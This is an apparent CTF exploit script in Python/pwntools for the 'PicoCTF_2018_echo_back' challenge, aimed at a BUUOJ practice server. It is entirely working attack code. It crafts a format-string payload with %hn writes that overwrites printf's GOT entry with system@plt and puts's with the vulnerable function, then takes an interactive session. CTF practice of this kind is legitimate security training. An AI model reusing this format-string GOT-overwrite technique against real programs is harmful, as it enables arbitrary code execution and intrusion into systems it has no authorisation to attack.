#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/07/23 10:41:51
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''
from pwn import *
from LibcSearcher import *
import pwnlib
debug = 0
context.log_level = 'debug'
context.arch = "i386"
if debug:
    if context.arch == "amd64":
        # sh = process(["./PicoCTF_2018_echo_back"],env={'LD_PRELOAD':'../../libc_file/16-64-libc-2.23.so'})
        sh = process('./PicoCTF_2018_echo_back')
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        #libc = ELF("../../libc_file/16-64-libc-2.23.so")
        one_offset = [0x45216,0x4526a,0xf02a4,0xf1147]
    else:
        # sh = process(["./PicoCTF_2018_echo_back"],env={'LD_PRELOAD':'../../libc_file/16-32-libc-2.23.so'})
        sh = process("./PicoCTF_2018_echo_back")
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        libc = ELF("../../libc_file/16-32-libc-2.23.so")
else:
    IP = 'node4.buuoj.cn'
    port = 29229
    sh = remote(IP,port)
    libc = ELF('/home/eur1ka/Desktop/Pwn/libc_file/16-64-libc-2.23.so')
def debug():
    gdb.attach(sh)
    pause()

elf = ELF('PicoCTF_2018_echo_back')
printf_got = 0x0804A010
puts_got = 0x0804A01C
system_plt = 0x08048460
vuln_addr = 0x080485AB
payload = p32(printf_got+2) + p32(puts_got+2) + p32(printf_got) + p32(puts_got)
num_1 = 0x804-0x10
num_2 = 0x8460 - 0x804
num_3 = 0x85AB - 0x8460
payload += "%"+str(0x804-0x10)+"c%7$hn%8$hn%"+str(0x8460 - 0x804)+"c%9$hn%" + str(0x85AB - 0x8460) + "c%10$hn"
sh.recvuntil("message:\n")
sh.send(payload)
sh.interactive()